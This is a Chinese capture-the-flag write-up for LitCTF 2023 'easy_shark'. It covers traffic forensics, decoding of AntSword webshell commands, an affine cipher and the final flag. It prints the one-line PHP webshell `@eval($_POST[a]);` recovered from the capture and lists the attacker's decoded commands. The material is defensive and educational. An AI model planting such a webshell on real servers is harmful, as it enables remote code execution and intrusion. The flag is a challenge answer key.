# [LitCTF 2023] easy_shark — 解题记录

## 结论

```
NSSCTF{w13e5hake_1s_a_900d_t3a771c_t001_a}
```

- 解密出的 flag 正文：`w13e5hake_1s_a_900d_t3a771c_t001`
- 一句话木马连接 key：`a`
- 按题目格式 `NSSCTF{flag_木马连接的key}` 拼成 `NSSCTF{<正文>_<key>}`

---

## Step 0 · 伪加密 ZIP

题目给的 `easy_shark.zip` 双击要密码。用 010 Editor / WinHex 打开：

- 搜 `50 4B 03 04`，跳到 Local File Header
- 把 `frFlags`（偏移 +6）和 `deFlags`（偏移 +8，或中央目录里对应字段）从 `0x09` 改成 `0x00`
- 另存后即可直接解压，得到 `easy_shark.pcapng`

> 本例给的是已经修复好的包，可跳过。判断依据：数据本身没加密，只是标志位被改。

---

## Step 1 · 流量里定位一句话木马 → 拿到 key

Wireshark 过滤：

```
http.request.method == "POST" && http contains "upload_file.php"
```

包 238（`192.168.73.128:80` ← `192.168.73.1`，响应包 240 是 `200 OK`）里是 multipart 上传，`filename="mm.php"`：

```php
<?php
@eval($_POST[a]);
?>
```

→ **木马连接 key = `a`**（`$_POST[a]`，方括号里没引号也合法）

后续所有请求都打到 `/mm.php`，参数名 `a`。

---

## Step 2 · 还原蚁剑（AntSword）命令

这台马是蚁剑的 PHP payload，编码规则很好认：

| 特征 | 含义 |
|---|---|
| `a` 参数里 `echo "6bc0"."be39";` | 响应前缀 marker（拼接后 `6bc0be39`） |
| `...` 后再 `echo "9a5d8"."74447";` | 响应后缀 marker |
| `base64_decode(substr($_POST["u7a25e6e42e159"],2))` | 值的前 **2 个字符是垃圾**，剩下才是 base64 |

所以两个解码动作：

1. 请求：`base64_decode(value[2:])` → 明文命令
2. 响应：`body[len(prefix):-len(suffix)]` → 真实输出

解码后的完整攻击时间线（关键部分）：

| # | 命令 | 结果 |
|---|---|---|
| 005 | 列目录 `/var/www/html/` | 看到 `mm.php` `upload_file.php` |
| 011 | `cd "/";ls` | 发现 `/flag` 目录 |
| 020 | `cd "/flag";ls` | `\`、`flag.txt` |
| 021 | `cat flag.txt` | `flag{1ook_th1s_1s_76ke_f1ag}` ← **假 flag** |
| 027 | `ls -a` | 多出隐藏文件 **`.f14g.txt`** |
| 041 | `cat .f14g.txt` | 谜题 + 密文 |
| 052 | `ls`（第二轮） | 多出 `win` |
| 053 | `cat win` | 真·密文 |

> 攻击者中途还试过 `cat \`（文件名就是反斜杠），被 shell 转义吃掉，返回 `cat: ';echo': No such file`——这也是为什么用 Wireshark 手动跟着看会一脸懵。

`.f14g.txt`（90 字节，诱饵）：

```
Can you request my question?

x^2-1834x+683280=0

#oooooUUoUoooooUooooUUUoooUoUUUoooUUU 
```

方程判别式 `1834² − 4·683280 = 630436 = 794²`，根是 **520** 和 **1314**（一生一世我爱你，纯干扰项）。

`win`（98 字节，真的）：

```
Can you request my question?

(x^2-x**2)+(x-17)(x-77)=0

#gezx{j13p5oznp_1t_z_900y_k3z771h_k001}
```

`(x² − x²) + (x−17)(x−77) = 0` → **x = 17 或 77**。

---

## Step 3 · 仿射密码解密

"一串密文 + 两个数字" → 仿射密码（Affine Cipher）。

- 加密：`E(x) = (a·x + b) mod 26`
- 解密：`D(y) = a⁻¹·(y − b) mod 26`

取 `a = 17`（必须与 26 互质，17 是质数 ✓），`b = 77`（`77 mod 26 = 25`）。
`17⁻¹ mod 26 = 23`（因为 `17×23 = 391 = 26×15 + 1`）。

验证密钥正确性：`f→g, l→e, a→z, g→x`，即 `flag` 加密后正好是 `gezx` ✓

数字和下划线不参与变换，原样保留：

```
密文: gezx{j13p5oznp_1t_z_900y_k3z771h_k001}
明文: flag{w13e5hake_1s_a_900d_t3a771c_t001}
```

再套一层 leet：`1→i, 3→r, 5→s, 7→f, 9→g, 0→o`
→ `wireshake_is_a_good_traffic_tooi`

（作者把 Wireshark 拼成了 `wireshake`，`t001` 的 `1` 兼作 `l` 与 `i`，属于出题人的手误 / 双重 leet。**提交时用原始的 leet 形式，不要还原成英文**。）

---

## Step 4 · 拼 flag

题目格式 `NSSCTF{flag_木马连接的key}`：

```
NSSCTF{ + w13e5hake_1s_a_900d_t3a771c_t001 + _ + a + }
```

```
NSSCTF{w13e5hake_1s_a_900d_t3a771c_t001_a}
```

---

## 附录 A · 本机没有 tshark 时的纯 Python 解法

本目录下的脚本（无第三方依赖，自己解析 pcapng + 重组 TCP + 解 gzip/分块）：

| 文件 | 作用 |
|---|---|
| `an.py` | pcapng 解块 + IPv4/TCP 解析 + 流重组，导出全部流 |
| `solve2.py` | 请求/响应配对，解 gzip，初版参数解码 |
| `solve3.py` | **精确版**：从 `a` 载荷取 marker，剥前后缀；`value[2:]` 解 base64 |
| `affine.py` | 仿射解密 + 暴力反查 (a,b) 验证 |

运行：

```powershell
$env:PYTHONUTF8='1'
& 'C:\Users\XiaoMibook\AppData\Local\Python\bin\python.exe' .\solve3.py
& 'C:\Users\XiaoMibook\AppData\Local\Python\bin\python.exe' .\affine.py
```

关键指标（用于交叉验证解析是否正确）：

- pcapng：1 个接口（linktype 1 = Ethernet），**1611** 个 EPB 块
- 时间跨度：`1675264250.624` → `1675266097.812`（约 1847 秒）
- 全部流量：`192.168.73.1` ↔ `192.168.73.128:80`，纯 HTTP，无 TLS
- `/mm.php` 的 POST 共 **60** 次

## 附录 B · 如果坚持用 Wireshark GUI

1. `http.request.method == "POST"` → Statistics → HTTP 看请求分布
2. 右键 → **Follow → HTTP Stream**，比 Follow TCP Stream 更干净
3. 响应是 gzip 的（首页 `/`），确认 `Preferences → Protocols → HTTP → Uncompress entity bodies` 是开的
4. 想直接搜密文：`http.file_data contains "gezx"`
5. 想搜木马：`http.file_data contains "eval"`，或按原始字节 `frame contains 3c:3f:70:68:70`（`<?php`）
6. `File → Export Objects → HTTP` 可以把 `mm.php`、`upload_file.php` 导出来看源码
